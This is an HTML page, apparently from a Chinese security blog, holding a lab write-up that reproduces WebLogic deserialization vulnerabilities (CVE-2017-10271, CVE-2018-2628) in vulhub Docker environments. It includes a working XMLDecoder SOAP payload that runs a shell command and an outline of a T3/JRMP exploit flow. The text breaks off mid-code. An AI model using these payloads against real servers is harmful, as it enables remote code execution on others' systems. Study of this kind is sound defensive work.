@@ -1,0 +1,1473 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
+<head>
+  <!-- Google Analytics -->
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-V3C5GQ73TE"></script>
+    <script type="text/javascript">
+      window.dataLayer = window.dataLayer || [];
+
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag('js', new Date());
+
+      gtag('config', 'G-V3C5GQ73TE');
+    </script>
+  
+
+  <!-- Baidu Tongji -->
+  
+    <script type="text/javascript">
+      // Originial
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?x";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  <!-- Baidu Push -->
+  
+    <script>
+      (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+      })();
+    </script>
+  
+
+  <meta charset="utf-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
+  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="description" content="Morouu的大狗窝 ●&#39;◡&#39;●"/>
+  <meta name="keyword" content="Morouu,morouu"/>
+  <link rel="shortcut icon" href="//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302341051.png"/>
+
+  <!-- Place this tag in your head or just before your close body tag. -->
+  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>
+
+  
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css"/>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/beantech.min.css"/>
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css"/>
+    <link rel="stylesheet" href="/css/widget.css"/>
+    <link rel="stylesheet" href="/css/rocket.css"/>
+    <link rel="stylesheet" href="/css/signature.css"/>
+    <link rel="stylesheet" href="/css/catalog.css"/>
+    <link rel="stylesheet" href="/css/livemylife.css"/>
+
+    
+      <!-- wave start -->
+      <link rel="stylesheet" href="/css/wave.css"/>
+      <!-- wave end -->
+    
+
+    
+      <!-- top start (article top hot config) -->
+      <link rel="stylesheet" href="/css/top.css"/>
+      <!-- top end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/scroll.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+      <!-- viewer start (Picture preview) -->
+      <link rel="stylesheet" href="/css/viewer.min.css"/>
+      <!-- viewer end -->
+    
+
+    
+      <!-- Search start -->
+      <link rel="stylesheet" href="/css/search.css"/>
+      <!-- Search end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/themecolor.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+
+    
+  
+
+  <!-- Custom Fonts -->
+  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- Hux change font-awesome CDN to qiniu -->
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
+  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
+
+  <!-- ga & ba script hoook -->
+  <link rel="canonical" href="https://morblog.cc/posts/3778261501/">
+  <title>
+    
+      漏洞复现 - weblogic(一) - Morouu的大狗窝 ●&#39;◡&#39;●
+    
+  </title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+
+	<body ontouchstart="" class="body--light body--light">
+
+
+		<!-- ThemeColor -->
+		
+		<!-- ThemeColor -->
+<style type="text/css">
+  .body--light {
+    --light-mode: none;
+    --dark-mode: block;
+  }
+  .body--dark {
+    --light-mode: block;
+    --dark-mode: none;
+  }
+  i.mdui-icon.material-icons.light-mode {
+    display: var(--light-mode);
+  }
+  i.mdui-icon.material-icons.dark-mode {
+    display: var(--dark-mode);
+  }
+</style>
+<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
+  <i class="mdui-icon material-icons light-mode"></i>
+  <i class="mdui-icon material-icons dark-mode"></i>
+</div>
+<script>
+  //getCookieValue
+  function getCookieValue(a) {
+    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
+    return b
+      ? b.pop()
+      : '';
+  }
+  let themeMode = 'light';
+  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
+    let dbody = document.body.classList;
+    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
+  }
+
+  //setCookieValue
+  var toggleBtn = document.querySelector(".toggle");
+  toggleBtn.addEventListener("click", function () {
+    var e = document.body.classList.contains("body--dark");
+    var cookieString = e
+      ? "dark"
+      : "light";
+    var exp = new Date();
+    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
+    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
+  });
+</script>
+
+		
+
+		<!-- Gitter -->
+		
+		<!-- Gitter -->
+<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
+<script>
+  ((window.gitter = {}).chat = {}).options = {
+    room: 'dmantick/morcruiser'
+  };
+</script>
+<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>
+
+		
+
+		<!-- Navigation (contains search)-->
+		<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header page-scroll">
+      <button type="button" class="navbar-toggle">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Morouu的大狗窝 ●&#39;◡&#39;●</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
+    <div id="huxblog_navbar">
+      <div class="navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a href="/">首页</a>
+          </li>
+
+          
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/categories/">
+              
+              分类
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              归档
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+
+          
+          <li>
+            <a class="popup-trigger">
+              <span class="search-icon"></span>搜索</a>
+          </li>
+          
+
+          <!-- LangSelect -->
+          
+          
+          
+          
+          
+        </ul>
+      </div>
+    </div>
+    <!-- /.navbar-collapse -->
+  </div>
+  <!-- /.container -->
+</nav>
+<!-- progress -->
+<div id="progress">
+  <div class="line" style="width: 0%;"></div>
+</div>
+
+<script>
+  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
+  var $body = document.body;
+  var $toggle = document.querySelector('.navbar-toggle');
+  var $navbar = document.querySelector('#huxblog_navbar');
+  var $collapse = document.querySelector('.navbar-collapse');
+
+  $toggle.addEventListener('click', handleMagic)
+
+  function handleMagic(e) {
+    if ($navbar.className.indexOf('in') > 0) {
+      // CLOSE
+      $navbar.className = " ";
+      // wait until animation end.
+      setTimeout(function() {
+        // prevent frequently toggle
+        if ($navbar.className.indexOf('in') < 0) {
+          $collapse.style.height = "0px"
+        }
+      }, 400)
+    } else {
+      // OPEN
+      $collapse.style.height = "auto"
+      $navbar.className += " in";
+    }
+  }
+</script>
+
+
+		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
+		<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+
+  <style type="text/css">
+    .body--light {
+      /* intro-header */
+      --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
+      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20201125160538983864_small.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20201125160538983864_small.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+    }
+    .body--dark {
+      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20201125160538983864_small.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20201125160538983864_small.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+    }
+
+    header.intro-header {
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20201125160538983864_small.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
+      
+    }
+
+    
+      #signature {/*signature*/
+        background-image: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302343273.png');
+      }
+    
+  </style>
+
+
+
+
+
+<header class="intro-header">
+  <!-- Signature -->
+  <div id="signature">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+          
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#安全" title="安全">安全</a>
+              
+              <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
+              
+              <a class="tag" href="/tags/#java" title="java">java</a>
+              
+            </div>
+            <h1>漏洞复现 - weblogic(一)</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by morouu on
+              2022-01-11
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count" >28</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">6.2k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
+          </div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- waveoverlay start -->
+  <div class="preview-overlay">
+    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+      <defs>
+        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
+      </defs>
+      <g class="preview-parallax">
+        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
+        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
+        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
+        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
+      </g>
+    </svg>
+  </div>
+  <!-- waveoverlay end -->
+  
+
+</header>
+
+
+
+		<!-- Main Content (Post contains
+	Pager、
+	tip、
+	socialshare、
+	gitalk、gitment、disqus-comment、
+	Catalog、
+	Sidebar、
+	Featured-Tags、
+	Friends Blog、
+	anchorjs、
+	) -->
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container" style="margin-left: 10%;">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <h1>漏洞复现 - weblogic(一)</h1>
+<hr>
+<p>​	该实验所有复现的漏洞环境均来自 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/weblogic">vulhub</a>。</p>
+<h2 id="CVE-2017-10271">- CVE-2017-10271 -</h2>
+<h3 id="实验环境">- 实验环境 -</h3>
+<p><code>docker-compose.yml</code>：</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:10.3.6.0-2017</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<ul>
+<li>10.3.6.0</li>
+<li>12.1.3.0.0</li>
+<li>12.2.1.1.0</li>
+</ul>
+<h3 id="漏洞分析">- 漏洞分析 -</h3>
+<p>据说这个漏洞的原因主要是没有严格的对用户输入的内容进行处理就送到了 <strong>XMLDecoder</strong> 进行解析，在解析过程中出现了反序列化漏洞，导致任意代码执行。而漏洞的关键点在 <code>wls-wsat.war</code> 包中，那么先把环境起了，再将所有相关的包copy出来并反编译分析下罢。</p>
+<p>根据漏洞的 <strong>POC</strong> 可知，是在访问了 <code>/wls-wsat/CoordinatorPortType11</code> 并传入适当的 <strong>xml</strong> 内容就会触发漏洞。实际上也就是这玩意👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201111656074.png" alt="image-20220111165549175"></p>
+<p>其 <code>servlet-name</code> 值为 <strong>CoordinatorPortTypeServlethttp11</strong> ，当访问这个 <strong>url</strong> 时会调用 <code>weblogic</code> 的 <strong>WLS Security</strong> 组件提供的 <strong>webservice</strong> 服务👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201111930978.png" alt="image-20220111174646353"></p>
+<p>这个 <strong>webservice</strong> 服务中就使用了 <strong>XMLDecoder</strong> 解析用户传入的 <strong>XML内容</strong> 继而在解析过程中对用户输入的恶意内容进行反序列化。其中，在 <code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest</code> 中会对用户输入的内容进行处理👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201111930567.png" alt="image-20220111193039913"></p>
+<p>这里的 <code>paramPacket.getMessage().getHeaders()</code> 实际上是从 <strong>soap</strong> 的 <code>soapenv:Header</code> 里边遍用户输入的XML内容的标签头部，跟进查看 <code>WorkAreaConstants.WORK_AREA_HEADER</code> 的值👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201111930601.png" alt="image-20220111191331928"></p>
+<p>简单来说👇</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;这里的内容连同该标签头部会被放到header1中，并作为参数调用readHeaderOld方法&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>那么，跟进 <code>readHeaderOld</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201111937866.png" alt="image-20220111193721073"></p>
+<p>最后跟进 <code>WorkContextXmlInputAdapter</code> 类的构造方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201111939569.png" alt="image-20220111193936456"></p>
+<p>显然这里是将输入的流传入到 <strong>XMLDecoder</strong> 中进行解析了。</p>
+<h3 id="复现过程">- 复现过程 -</h3>
+<p>先使用 <code>docker-compose up -d</code> 将环境起了，然后访问 <code>http://ip:port/wls-wsat/CoordinatorPortType11</code>，并使用以下内容进行请求👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201112123781.png" alt="image-20220111212307650"></p>
+<p>之后即可在环境里面发现 <strong>/tmp/ok</strong> 文件👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201112122605.png" alt="image-20220111212222500"></p>
+<p>实际上，由上边的代码分析不难看出，在对 <strong>XML内容</strong> 的处理中会先将前两个标签舍去👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201112127801.png" alt="image-20220111212713720"></p>
+<p>所以恶意内容应放到第二个标签内，同时第二个标签的名称并不影响漏洞的触发。</p>
+<h3 id="exp">- exp -</h3>
+<p>简单的exp👇</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">testtest</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span> </span><br><span class="line">          <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span> </span><br><span class="line">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">string</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span> </span><br><span class="line">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span> </span><br><span class="line">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami&gt;/tmp/ok<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">          <span class="tag">&lt;/<span class="name">array</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;/<span class="name">testtest</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="CVE-2018-2628">- CVE-2018-2628 -</h2>
+<h3 id="实验环境-2">- 实验环境 -</h3>
+<p><code>docker-compose.yml</code> (为了更好的复现多用一个镜像作为攻击机)：</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">extnetwork:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">default</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.20</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:10.3.6.0-2017</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7002:7001&quot;</span></span><br><span class="line">   <span class="attr">networks:</span></span><br><span class="line">    <span class="attr">extnetwork:</span></span><br><span class="line">     <span class="attr">ipv4_address:</span> <span class="number">172.20</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line"> <span class="attr">ubuntu:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">ubuntu:18.04</span></span><br><span class="line">  <span class="attr">stdin_open:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">entrypoint:</span> [<span class="string">&quot;sh&quot;</span>]</span><br><span class="line">  <span class="attr">networks:</span></span><br><span class="line">   <span class="attr">extnetwork:</span></span><br><span class="line">    <span class="attr">ipv4_address:</span> <span class="number">172.20</span><span class="number">.0</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<ul>
+<li>10.3.6.0</li>
+<li>12.1.3.0</li>
+<li>12.2.1.2</li>
+<li>12.2.1.3</li>
+</ul>
+<h3 id="漏洞分析-2">- 漏洞分析 -</h3>
+<p>据说是由于 <code>weblogic server WLS core components</code> 的存在反序列化漏洞，并能通过t3协议触发导致远程代码执行。因为现在太菜了不太懂先留着，后面补上罢。我又来了，隔了一天觉得不妨先从payload中的反序列化内容逐步分析(学习)比较好。</p>
+<p>那么先用物理机从 <strong><a target="_blank" rel="noopener" href="http://exploit.py">exploit.py</a></strong>  的操作看起，其中，目标 <strong>ip</strong> 为 <strong>192.168.3.35</strong> ，暴露 <strong>端口</strong> 为 <strong>7002</strong> ， 在本地用 <code>ysoserial</code> 起服务的攻击机 <strong>ip</strong> 为 <strong>172.20.0.5</strong> , 服务监听 <strong>端口</strong> 为 <strong>2001</strong> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114121723460.png" alt="image-20220114121723460"></p>
+<p>继续跟进 <code>exploit</code> 函数，可以简单的得到整个 <strong>exp</strong> 执行的流程👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114122057714.png" alt="image-20220114122057714"></p>
+<p>跟进 <code>t3_handshake</code> 函数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114000658423.png" alt="image-20220114000658423"></p>
+<p>这里是进行了简单的握手操作，接着再往下跟进 <code>build_t3_request_object</code> 函数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114002638427.png" alt="image-20220114002638427"></p>
+<p>到这里还并没有看出什么，继续跟进下边的 <code>generate_payload</code> 函数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114122724278.png" alt="image-20220114122724278"></p>
+<p>其中 <code>rmi</code> 即是 <strong>Remote Method Invocation(远程方法调用)</strong> ，而 <code>jrmp</code> 即是 <strong>Java Remote MessagingProtocol(java远程信息交换协议)</strong> 。 前者顾名思义可以调用远程的方法，后者则是可以可以查找和引用远程的对象。<code>jrmp</code> 是运行在 <code>rmi</code> 之下的，而 <code>RemoteObjectInvocationHandler</code>  的 <code>UnicastRef</code> 建立的远程连接是使用 <code>jrmp</code> 协议的，并且使用该协议连接到开启了 <code>jrmp</code> 服务端的客户端会无条件反序列化从服务端收到的任何响应内容(应该差不多是这个意思吧)。接着看最后的 <strong>payload</strong> 数据构造👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220114123918679.png" alt="image-20220114123918679"></p>
+<p>这里不妨先随手写一个 <code>rmi</code> 然后简单查看一下通信内容👇</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span 